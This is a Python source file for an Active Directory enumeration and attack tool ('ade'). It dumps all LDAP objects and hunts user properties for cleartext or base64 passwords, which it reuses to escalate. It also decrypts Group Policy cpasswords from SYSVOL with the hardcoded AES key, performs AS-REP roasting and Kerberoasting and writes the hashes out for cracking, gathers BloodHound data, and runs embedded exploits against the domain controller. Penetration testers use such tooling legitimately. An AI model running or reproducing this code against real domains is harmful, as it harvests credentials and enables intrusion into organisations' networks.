#!/usr/bin/env python3
from ldap3 import Server, Connection, ALL, ALL_ATTRIBUTES, LEVEL, SUBTREE, ALL_OPERATIONAL_ATTRIBUTES
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError
from progressbar import Bar, Percentage, ProgressBar, ETA
from ldap3.core.exceptions import LDAPKeyError
from impacket.smbconnection import SessionError
from impacket.nmb import NetBIOSTimeout, NetBIOSError
from getpass import getpass
from termcolor import colored
from impacket import smbconnection
from impacket.dcerpc.v5 import srvs, epm
import contextlib, argparse, sys, socket, json, re, os, base64
from Cryptodome.Cipher import AES
from dns.resolver import NXDOMAIN
import textwrap

# Thanks SecureAuthCorp for GetNPUsers.py
# For Kerberos preauthentication
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify
import datetime, random
from .modEnumerator.modEnumerator import ModEnumerator
from .connectors.connectors import Connectors

# Thanks SecureAuthCorp for GetUserSPNs.py
# For SPN enum
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.krb5.asn1 import TGS_REP

from bloodhound import BloodHound, resolve_collection_methods
from bloodhound.ad.domain import AD
from bloodhound.ad.authentication import ADAuthentication


class EnumAD():

    def __init__(self, domainController, ldaps, output, enumsmb, bhout, kpre, spnEnum, searchSysvol, dryrun, domuser=None):
        self.server = domainController
        self.domuser = domuser
        self.ldaps = ldaps
        self.output = output if output is not None else domainController
        self.bhout = bhout
        self.kpre = kpre
        self.spnEnum = spnEnum
        self.enumsmb = enumsmb
        self.searchSysvol = searchSysvol

        self.ou_structure = domainController.split('.')
        self.dc_string=''
        for element in self.ou_structure:
            self.dc_string += 'dc={},'.format(element)
        
        # LDAP properties
        # At the moment we just want everything
        self.ldapProps = ["*"]

        # Initialize modules
        self.connectors = Connectors()
        self.enumerator = ModEnumerator()

        # Setting lists containing elements we want from the domain controller
        self.computers = []
        self.people = []
        self.groups = []
        self.spn = []
        self.acl = []
        self.gpo = []
        self.domains = []
        self.ous = []
        self.deletedUsers = []
        self.passwd = False
        self.passwords = {}
        # Holds the values of servers that has been fingerprinted to a particular service
        self.namedServers = {}

        # TODO: Figure a good way to go through the code dryrun
        if dryrun:
            print(self.server, self.domuser, self.ldaps, self.output, self.bhout, self.kpre, self.spnEnum, self.enumsmb, self.searchSysvol, self.ou_structure, self.dc_string)
            return

        if domuser is not False:
            self.runWithCreds()
        else:
            self.runWithoutCreds()

        self.enumNULLSessions()
        self.enumDeleted()
        self.enumerate_names()
        self.checkForPW()
        self.checkOS()
        self.write_file()
        self.testExploits()

        # Unbind the connection to release the handle
        self.conn.unbind()
 

    def runWithCreds(self):
        self.CREDS = True
        if not self.passwd:
            self.passwd = str(getpass())
        self.bind()
        self.search()
       
        self.checkForPW()
        self.checkOS()
        if self.searchSysvol:
            self.checkSYSVOL()

        if self.bhout:
            self.outputToBloodhoundJson()
    
        if self.kpre:
            self.enumKerbPre()
    
        if self.spnEnum:
            self.enumSPNUsers()
        
        self.conn.unbind()
        
        if self.enumsmb:
            # Setting variables for further testing and analysis
            self.smbShareCandidates = []
            self.smbBrowseable = {}
            self.sortComputers()
            self.enumSMB()

        # Lets clear variable now
        self.passwd = None

        return


    def runWithoutCreds(self):
        self.CREDS = False
        print('[ ' + colored('INFO', 'green') + ' ] Attempting to get objects without credentials')           
        self.passwd = ''
        self.domuser = ''
        print('')

        self.bind()        
        self.search()
       
        self.enumForCreds(self.people)
        
        return

    
    @contextlib.contextmanager
    def suppressOutput(self):
        with open(os.devnull, 'w') as devnull:
            with contextlib.redirect_stderr(devnull) as err, contextlib.redirect_stdout(devnull) as out:
                yield (err, out)


    def enumDeleted(self):
        if len(self.deletedUsers) > 0:
            print('[ ' + colored('INFO', 'green') +' ] Searching for juicy info in deleted users')
            self.enumForCreds(self.deletedUsers)

    
    def enumNULLSessions(self):
        self.enumerator.enumNULLSessions(self.server, self.connectors)
    

    def testExploits(self):
        from .exploits import exploits
        print('[ ' + colored('INFO', 'green') +' ] Attempting to run imbedded exploits...')
        exp = exploits.Exploits()
        exp.run(self.server, self.computers[0]["name"])
        
        if len(exp.vulnerable) > 0:
            cves = ""
            for exploit in exp.vulnerable:
                    cves += f"{exploit}, "
            print('[ ' + colored('WARN', 'yellow') + f' ] DC may be vulnerable to: [ ' + colored(cves[:-2], 'green') + ' ]')
        else:
            print('[ ' + colored('OK', 'green') + ' ] DC not vulnerable to included exploits')


    def bind(self): 
        try:
            if self.ldaps:
                self.conn = self.connectors.ldap_connector(self.server, True, self.domuser, self.passwd)
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Bound to LDAPS server: {0}'.format(self.server))
            else:
                self.conn = self.connectors.ldap_connector(self.server, False, self.domuser, self.passwd)
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Bound to LDAP server: {0}'.format(self.server))
        # TODO: Catch individual exceptions instead
        except (LDAPBindError, LDAPSocketOpenError):
            if self.ldaps:
                print('\033[1A\r[ ' + colored('ERROR', 'red') +' ] Failed to bind to LDAPS server: {0}'.format(self.server))
            else:
                print('\033[1A\r[ ' + colored('ERROR', 'red') +' ] Failed to bind to LDAP server: {0}'.format(self.server))
            sys.exit(1)


    def search(self):
        # Get computer objects
        self.conn.search(self.dc_string[:-1], '(&(sAMAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.computers.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Computer objects')

        # Get person objects
        self.conn.search(self.dc_string[:-1], '(objectCategory=person)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.people.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Person objects')
        
        # Get group objects
        self.conn.search(self.dc_string[:-1], '(|(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913)(primarygroupid=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.groups.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Group objects')

        # Get SPN objects
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(serviceprincipalname=*))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.spn.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all SPN objects')

        # Get ACL objects
        self.conn.search(self.dc_string[:-1], '(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)(samAccountType=268435457)(samAccountType=536870912)(samAccountType=536870913)(objectClass=domain)(&(objectcategory=groupPolicyContainer)(flags=*))(objectcategory=organizationalUnit))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.acl.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all ACL objects')

        # Get GPO objects
        self.conn.search(self.dc_string[:-1], '(|(&(&(objectcategory=groupPolicyContainer)(flags=*))(name=*)(gpcfilesyspath=*))(objectcategory=organizationalUnit)(objectClass=domain))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.gpo.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all GPO objects')

        # Get Domain
        self.conn.search(self.dc_string[:-1], '(objectclass=domain)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.domains.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all Domains')

        # Get OUs
        self.conn.search(self.dc_string[:-1], '(objectclass=organizationalUnit)', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            self.ous.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all OUs')

        # Get deleted users
        self.conn.search(self.dc_string[:-1], '(objectclass=user)', attributes=self.ldapProps, search_scope=SUBTREE, controls=[('1.2.840.113556.1.4.417', True, None)])
        for entry in self.conn.entries:
            self.deletedUsers.append(entry)
        print('[ ' + colored('OK', 'green') +' ] Got all deleted users')

        
    def enumerate_names(self):
        self.namedServers = self.enumerator.enumerate_server_names(self.computers)


    '''
        Since it sometimes is real that the property 'userPassword:' is set
        we test for it and dump the passwords
    '''
    def checkForPW(self):
        passwords = self.enumerator.enumerate_for_cleartext_passwords(self.people, self.server)
        self.passwords = { **passwords, **self.passwords }

        if len(self.passwords.keys()) > 0:
            with open(f'{self.output}-clearpw', 'w') as f:
                json.dump(self.passwords, f, sort_keys=False)

        if len(self.passwords.keys()) == 1:
            print('[ ' + colored('WARN', 'yellow') +' ] Found {0} clear text password'.format(len(self.passwords.keys())))
        elif len(self.passwords.keys()) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} clear text password'.format(len(self.passwords.keys())))
        else:
            print('[ ' + colored('OK', 'green') +' ] Found {0} clear text passwords'.format(len(self.passwords.keys())))


    '''
        While it is not unusual to find EOL servers hidden or forgotten these 
        often makes easier targets for lateral movemen, and because of that 
        we'll dump the lowest registered OS and the respective hosts for easier 
        enumeration afterwards
    '''
    def checkOS(self):
        os_json = self.enumerator.enumerate_os_version(self.computers)

        for key, value in os_json.items():
            if len(value) == 0:
                continue
            with open(f'{self.output}-oldest-OS', 'w') as f:
                for item in value:
                    f.write('{0}: {1}\n'.format(key, item))
                break

        print('[ ' + colored('OK', 'green') + f' ] Wrote hosts with oldest OS to {self.output}-oldest-OS')


    def checkSYSVOL(self):
        print('[ .. ] Searching SYSVOL for cpasswords\r')
        cpasswords = {}
        try:
            smbconn = self.connectors.smb_connector(self.server, self.domuser, self.passwd)
            dirs = smbconn.listShares()
            for share in dirs:
                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
                    for dirname in paths:
                        try:
                            # Dont want . or ..
                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                            for sub in subPath:
                                if len(sub.get_shortname()) > 2:
                                    paths.append(dirname + '\\' + sub.get_shortname())
                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                            continue
                
                    # Compile regexes for username and passwords
                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')

                    # Prepare the ciphers based on MSDN article with key and IV
                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
                
                    # Since the first entry is the DC we dont want that
                    for item in paths[1:]:
                        if '.xml' in item.split('\\')[-1]:
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                                try:
                                    fileContent = f.read()
                                    passwdMatch = cpassRE.findall(str(fileContent))
                                    for passwd in passwdMatch:
                                        unameMatch = unameRE.findall(str(fileContent))
                                        for usr in unameMatch:
                                            padding = '=' * (4 - len(passwd) % 4) 
                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
                                except (UnicodeDecodeError, AttributeError) as e:
                                    # Remove the files we had to write during the search
                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
                                    continue

                            # Remove the files we had to write during the search
                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))

            if len(cpasswords.keys()) > 0:
                with open('{0}-cpasswords.json'.format(self.server), 'w') as f:
                    json.dump(cpasswords, f)

            if len(cpasswords.keys()) == 1:
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpassword in a GPO on SYSVOL share'.format(len(cpasswords.keys())))
            else:
                print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpasswords in GPOs on SYSVOL share'.format(len(cpasswords.keys())))


        except (SessionError, UnicodeEncodeError, NetBIOSError):
            print('[ ' + colored('ERROR', 'red') + ' ] Some error occoured while searching SYSVOL')
        else:
            smbconn.close()


    def splitJsonArr(self, arr):
        if isinstance(arr, list):
            if len(arr) == 1:
                return arr[0]
        return arr


    def outputToBloodhoundJson(self):
        print('[ ' + colored('OK', 'green') +' ] Generating BloodHound output - this may take time...')
        try:
            with self.suppressOutput():
                opts = argparse.Namespace(dns_tcp=False, global_catalog=self.server)
                auth = ADAuthentication(username=self.domuser, password=self.passwd, domain=self.server)
                try:
                    ad = AD(auth=auth, domain=self.server, nameserver=None, dns_tcp=False)
                    ad.dns_resolve(kerberos=False, domain=self.server, options=opts)
                except (NXDOMAIN) as e:
                    # So we didnt succeed with DNS lookup. Most likely an internal, so lets try to point to the DC
                    print('[ ' + colored('WARN', 'yellow') +' ] DNS lookup of Domain Controller failed - attempting to set the DC as Nameserver')
                try:
                    ns = socket.gethostbyname(self.server)
                    opts = argparse.Namespace(dns_tcp=False, global_catalog=self.server, nameserver=ns)
                    ad = AD(auth=auth, domain=self.server, nameserver=ns, dns_tcp=False)
                    ad.dns_resolve(kerberos=False, domain=self.server, options=opts)
                except (NXDOMAIN) as e:
                    # I'm all out of luck
                    print('[ ' + colored('ERROR', 'red') +' ] DNS lookup of Domain Controller failed with DC as nameserver')
                    exit(1)
            with self.suppressOutput():
                bloodhound = BloodHound(ad)
                bloodhound.connect()
                collection = resolve_collection_methods('Session,Trusts,ACL,DCOM,RDP,PSRemote')
                bloodhound.run(collect=collection, num_workers=40, disable_pooling=False)
            print('[ ' + colored('OK', 'green') +' ] BloodHound output generated')
        except Exception as e:
            print('[ ' + colored('ERROR', 'red') + f' ] Generating BloodHound output failed: {e}')


    def sortComputers(self):
        for computer in self.computers:
            try:
                self.smbShareCandidates.append(computer['dNSHostName'])
            except LDAPKeyError:
                # No dnsname registered
                continue
        if len(self.smbShareCandidates) == 1:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsname'.format(len(self.smbShareCandidates)))
        else:
            print('[ ' + colored('OK', 'green') +' ] Found {0} dnsnames'.format(len(self.smbShareCandidates)))


    def enumSMB(self):
        progBar = ProgressBar(widgets=['SMBConnection test: ', Percentage(), Bar(), ETA()], maxval=len(self.smbShareCandidates)).start()
        prog = 0
        try:
            for dnsname in self.smbShareCandidates:
                try:
                    # Changing default timeout as shares should respond withing 5 seconds if there is a share
                    # and ACLs make it available to self.user with self.passwd
                    smbconn = self.connectors.smb_connector(self.server, self.domuser, self.passwd)
                    dirs = smbconn.listShares()
                    self.smbBrowseable[str(dnsname)] = {}
                    for share in dirs:
                        self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
                        try:
                            _ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                            self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
                        except (SessionError, UnicodeEncodeError, NetBIOSError):
                            # Didnt have permission, all good
                            # Im second guessing the below adding to the JSON file as we're only interested in the listable directories really
                            #self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = False
                            continue
                    smbconn.logoff()
                    progBar.update(prog + 1)
                    prog += 1
                except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
                    # TODO: Examine why we sometimes get:
                    # impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE
                    # on healthy shares. It seems to be reported with CIF shares 
                    progBar.update(prog + 1)
                    prog += 1
                    continue
        except ValueError:
            # We reached end of progressbar, continue since we finish below
            pass
        progBar.finish()
        print('')

        availDirs = []
        for key, value in self.smbBrowseable.items():
            for _, v in value.items():
                if v:
                    availDirs.append(key)

        if len(self.smbShareCandidates) == 1:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} share and {1} share with {2} subdirectories/files is browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
        else:
            print('[ ' + colored('OK', 'green') + ' ] Searched {0} shares and {1} shares with {2} subdirectories/file sare browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
        if len(self.smbBrowseable.keys()) > 0:
            with open('{0}-open-smb.json'.format(self.server), 'w') as f:
                json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
            print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.server))



    def write_file(self):
        with open(str(self.output) + '-computers', 'w') as f:
            for item in self.computers:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-people', 'w') as f:
            for item in self.people:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-groups', 'w') as f:
            for item in self.groups:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-spn', 'w') as f:
            for item in self.spn:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-acl', 'w') as f:
            for item in self.acl:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-gpo', 'w') as f:
            for item in self.gpo:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-domains', 'w') as f:
            for item in self.domains:
                f.write(str(item))
                f.write("\n")
        with open(str(self.output) + '-ous', 'w') as f:
            for item in self.ous:
                f.write(str(item))
                f.write("\n")

        print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))


    def enumKerbPre(self):
        from .attacks.asreproast import asreproast
        roaster = asreproast.AsRepRoast()
        # Build user array
        users = []
        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
        for entry in self.conn.entries:
            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
        if len(users) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
        elif len(users) == 1:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
    
        hashes = []
        # Build request for Tickets
        for usr in users:
            userHash = roaster.RepRoast(self.server, usr)
            if userHash:
                hashes = hashes + userHash

        if len(hashes) > 0:
            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
                for h in hashes:
                    f.write(str(h) + '\n')

            print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
        else:
            print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')


    def enumSPNUsers(self):
        from .attacks.kerberoast import kerberoast
        kerberoaster = kerberoast.Kerberoast()

        users_spn = {}
        user_tickets = {}

        userDomain = self.domuser.split('@')[1]

        idx = 0
        for entry in self.spn:
            spns = json.loads(self.spn[idx].entry_to_json())
            users_spn[self.splitJsonArr(spns['attributes'].get('name'))] = self.splitJsonArr(spns['attributes'].get('servicePrincipalName')) 
            idx += 1    
        for user, spn in users_spn.items():
            if isinstance(spn, list):
                # We only really need one to get a ticket
                spn = spn[0]
            else:
                tickets = kerberoaster.roast(self.domuser, self.passwd, userDomain, user, spn)
                if tickets:
                    user_tickets = { **user_tickets, **tickets }

        if len(user_tickets.keys()) > 0:
            with open('{0}-spn-tickets'.format(self.server), 'w') as f:
                for key, value in user_tickets.items():
                    f.write('{0}:{1}\n'.format(key, value))
            if len(user_tickets.keys()) == 1:
                print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
            else:
                print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
        else:
            print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))


    def enumForCreds(self, ldapdump):
        searchTerms = [
                'legacy', 'pass', 'password', 'pwd', 'passcode'
        ]
        excludeTerms = [
                'badPasswordTime', 'badPwdCount', 'pwdLastSet', 'legacyExchangeDN'
        ]
        possiblePass = {}
        idx = 0
        for _ in ldapdump:
            user = json.loads(ldapdump[idx].entry_to_json())
            for prop, value in user['attributes'].items():
                if any(term in prop.lower() for term in searchTerms) and not any(ex in prop for ex in excludeTerms):
                    try:
                        possiblePass[user['attributes']['userPrincipalName'][0]] = value[0]
                    except KeyError:
                        # Could be a service user instead
                        try:
                            possiblePass[user['attributes']['servicePrincipalName'][0]] = value[0]
                        except KeyError:
                            # Don't know which type
                            continue

            idx += 1
        if len(possiblePass) > 0:
            print('[ ' + colored('INFO', 'green') +' ] Found possible password in properties - attempting to determine if it is a password')

            for user, password in possiblePass.items():
                try:
                    usr, passwd = self.entroPass(user, password)
                except TypeError:
                    # None returned, just continue
                    continue
            if not self.CREDS:
                self.domuser = usr
                self.passwd = passwd
                self.passwords[usr] = passwd
                self.runWithCreds()
                return


    def entroPass(self, user, password):
        test_conn = None
        if not password:
            return None
        # First check if it is a clear text
        try:
            test_conn = self.connectors.ldap_connector(self.server, True, user, password)
        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
            try:
                test_conn = self.connectors.ldap_connector(self.server, False, user, password)
            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
                pass
        if test_conn:
            # Validate the login (bind) request
            if int(test_conn.result['result']) != 0:
                if self.CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible clear text password'.format(user, password))
                else:
                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not cleartext'.format(user, password))
            else:
                if self.CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property'.format(user, password))
                else:
                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property - continuing with these creds'.format(user, password))
                    print('')
                    return user, password
            test_conn.unbind()
            test_conn = None

        # Attempt for base64
        # Could be base64, lets try
        try:
            pw = base64.b64decode(bytes(password, encoding='utf-8')).decode('utf-8')
        except base64.binascii.Error:
            return None
    
        # Attempt decoded PW
        try:
            test_conn = self.connectors.ldap_connector(self.server, True, user, pw)
        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
            try:
                test_conn = self.connectors.ldap_connector(self.server, False, user, pw)
            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
                pass
        if test_conn:
            # Validate the login (bind) request
            if int(test_conn.result['result']) != 0:
                test_conn.unbind()
                if self.CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible base64 decoded password'.format(user, pw))
                else:
                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not base64 encoded'.format(user, pw))
            else:
                if self.CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property'.format(user, pw))
                else:
                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property - continuing with these creds'.format(user, pw))
                    print('')
                    return user, pw




def main(args):
    parser = argparse.ArgumentParser(prog='ade', formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
                ___        __  _            ____  _                __                   ______                    
               /   | _____/ /_(_)   _____  / __ \(_)_______  _____/ /_____  _______  __/ ____/___  __  ______ ___ 
              / /| |/ ___/ __/ / | / / _ \/ / / / / ___/ _ \/ ___/ __/ __ \/ ___/ / / / __/ / __ \/ / / / __ `__ \\
             / ___ / /__/ /_/ /| |/ /  __/ /_/ / / /  /  __/ /__/ /_/ /_/ / /  / /_/ / /___/ / / / /_/ / / / / / /
            /_/  |_\___/\__/_/ |___/\___/_____/_/_/   \___/\___/\__/\____/_/   \__, /_____/_/ /_/\__,_/_/ /_/ /_/ 
                                                                              /____/                             

        /*----------------------------------------------------------------------------------------------------------*/

                '''))
    parser.add_argument('--dc', type=str, help='Hostname of the Domain Controller')
    parser.add_argument('-o', '--out-file', type=str, help='Name prefix of output files (default: the name of the dc)')
    parser.add_argument('-u', '--user', type=str, help='Username of the domain user to query with. The username has to be domain name as `user@domain.org`')
    parser.add_argument('-s', '--secure', help='Try to estalish connection through LDAPS', action='store_true')
    parser.add_argument('-smb', '--smb', help='Force enumeration of SMB shares on all computer objects fetched', action='store_true')
    parser.add_argument('-kp', '--kerberos_preauth', help='Attempt to gather users that does not require Kerberos preauthentication', action='store_true')
    parser.add_argument('-bh', '--bloodhound', help='Output data in the format expected by BloodHound', action='store_true')
    parser.add_argument('-spn', help='Attempt to get all SPNs and perform Kerberoasting', action='store_true')
    parser.add_argument('-sysvol', help='Search sysvol for GPOs with cpassword and decrypt it', action='store_true')
    parser.add_argument('--all', help='Run all checks', action='store_true')
    parser.add_argument('--no-creds', help='Start without credentials', action='store_true')
    parser.add_argument('--dry-run', help='Don\'t execute a test but run as if. Used for testing params etc.', action='store_true')
    parser.add_argument('--exploit', type=str, help='Show path to PoC exploit code')
    parser.add_argument('--version', help='Print currently installed version', action='store_true')

    if len(args) == 1:
        parser.print_help(sys.stderr)
        sys.exit(0)

    args = parser.parse_args()

    if args.exploit:
        from .exploits.exploits import Exploits
        exp = Exploits()
        queryResult = exp.query_exploits(args.exploit)

        if queryResult:
            print('Exploit for: ' + colored(args.exploit.lower(), 'green') + f' can be found at: {queryResult}')
            sys.exit(0)
        else:
            print(f'{args.exploit.lower()} not in imbedded exploits')
            sys.exit(0)

    if args.version:
        import pkg_resources
        version = pkg_resources.require("ActiveDirectoryEnum")[0].version
        print(f'ActiveDirectoryEnum (ade) version: {version}')
        sys.exit(0)

    if not args.dc:
        print("--dc argument is required")
        sys.exit(0)

    # If theres more than 4 sub'ed (test.test.domain.local) - tough luck sunny boy
    domainRE = re.compile(r'^((?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z]+)$')
    userRE = re.compile(r'^([a-zA-Z0-9-\.]+@(?:[a-zA-Z0-9-.]+)?(?:[a-zA-Z0-9-.]+)?[a-zA-Z0-9-]+\.[a-zA-Z0-9-]+)$')

    domainMatch = domainRE.findall(args.dc)

    if not domainMatch:
        print('[ ' + colored('ERROR', 'red') +' ] Domain flag has to be in the form "domain.local"')
        sys.exit(1)

    if args.all:
        args.smb = True
        args.kerberos_preauth = True
        args.bloodhound = True
        args.spn = True
    if args.no_creds:
        args.user = False
    else:
        userMatch = userRE.findall(args.user)
        if not userMatch:
            print('[ ' + colored('ERROR', 'red') +' ] User flag has to be in the form "user@domain.local"')
            sys.exit(1)


    # Boolean flow control flags
    file_to_write = None
    if args.out_file:
        file_to_write = args.out_file

    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.sysvol, args.dry_run, args.user)

    # Just print a blank line for output sake
    print('')
